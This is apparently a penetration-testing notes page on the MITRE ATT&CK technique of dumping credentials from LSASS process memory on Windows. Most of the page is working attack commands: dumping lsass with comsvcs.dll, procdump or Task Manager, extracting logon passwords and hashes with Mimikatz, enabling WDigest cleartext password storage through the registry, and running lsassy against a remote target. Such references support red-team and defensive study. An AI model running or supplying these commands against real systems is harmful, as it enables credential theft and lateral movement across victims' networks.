

https://attack.mitre.org/techniques/T1003/001/

# ATTACK ID:

[T1003.001](https://attack.mitre.org/techniques/T1003/001/)

**Permissions Required:** **Administrator** | **SYSTEM**

**Description**

Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

# Techniques

## comsvcs.dll

```powershell
# Get lsass.exe PID
tasklist /fi "Imagename eq lsass.exe"

# Call comsvcs.dll and dump to file.
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> \Windows\Temp\lsass_dump.dmp full

# Dump with Mimikatz
Invoke-Mimikatz -Command "sekurlsa::Minidump lsass_dump.dmp"
Invoke-Mimikatz -Command "sekurlsa::logonPasswords /full"
```

## Mimikatz

```powershell
Invoke-Mimikatz -DumpCreds
```

![](https://viperone.gitbook.io/~gitbook/image?url=https%3A%2F%2F1600278159-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFlgUPYI8q83vG2IJpI%252Fuploads%252FSPiXG5ELfSnRBMuklacX%252FMimikatz-DumpCreds.png%3Falt%3Dmedia%26token%3D3222cc7f-fac7-4e62-986f-0ccf7dc3f4b6&width=768&dpr=4&quality=100&sign=485db1cf&sv=2)

## Procdump

**URL:** [https://docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)

```powershell
.\procdump.exe -accepteula -ma lsass.exe lsass_dump
```

![](https://viperone.gitbook.io/~gitbook/image?url=https%3A%2F%2F1600278159-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFlgUPYI8q83vG2IJpI%252Fuploads%252F47IsFbRfy9U08kxn0rxX%252Fprocdump.png%3Falt%3Dmedia%26token%3D44800fe7-153d-4b8b-84c6-0d3455d4488a&width=768&dpr=4&quality=100&sign=5e343d5f&sv=2)

`Mimikatz` can then be used to pull information from the `lsass_dump.dmp` file.

```powershell
Invoke-Mimikatz -Command "sekurlsa::Minidump lsass_dump.dmp"
Invoke-Mimikatz -Command "sekurlsa::logonPasswords /full"
```

# Dumping Cleartext Credentials

The storage mechanism used by WDigest stores passwords in clear text in memory. If an adversary gains access to a system , they can utilize tools like Mimikatz and Lsassy to retrieve not only the password hashes stored in memory, but also the actual passwords in clear text

As a consequence, the attacker would not be restricted to only Pass-the-Hash methods of lateral movement, but could potentially gain access to other resources such as Exchange, internal websites, and any other systems that require a user ID and password for authentication.

```powershell
# CMD (Enable), Requires user to log off/on or lock screen to store in cleartext
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

# CMD (Disable), System reboot required to complete
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

```powershell
# Mimikatz (Everything)
Invoke-Mimikatz -DumpCreds
# Mimikatx (Just WDigest)
Invoke-Mimikatz -Command '"sekurlsa::wdigest"'

# Lsassy
lsassy -u '[User]' -p '[Password]' -d '[Domain]' '[Target-IP]' --users --exec smb
```

![](https://viperone.gitbook.io/~gitbook/image?url=https%3A%2F%2F1600278159-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFlgUPYI8q83vG2IJpI%252Fuploads%252FaTn4IopdqbLQqXOJb3az%252Fimage.png%3Falt%3Dmedia%26token%3D0f862ac8-40a0-432a-99dd-94d72e1afb61&width=768&dpr=4&quality=100&sign=653f313&sv=2)

# Task Manager / RDP

With Administrative RDP or interactive logon it is possible to create a dump file from Lsass.exe using Task Manger.

_Lsass.exe -> Right Click -> Create Dump File_

![](https://viperone.gitbook.io/~gitbook/image?url=https%3A%2F%2F1600278159-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFlgUPYI8q83vG2IJpI%252Fuploads%252FxMxmVSjGEsEUFQa3MZMf%252Fimage.png%3Falt%3Dmedia%26token%3D8a47a124-ed35-4daa-9984-8dd1304fba49&width=768&dpr=4&quality=100&sign=9140eaef&sv=2)

Use Mimikatz to read the dump file after transfering the file to an attacker controlled system

```powershell
Invoke-Mimikatz -Command "sekurlsa::Minidump lsass.DMP"
Invoke-Mimikatz -Command "sekurlsa::logonPasswords /full"
```
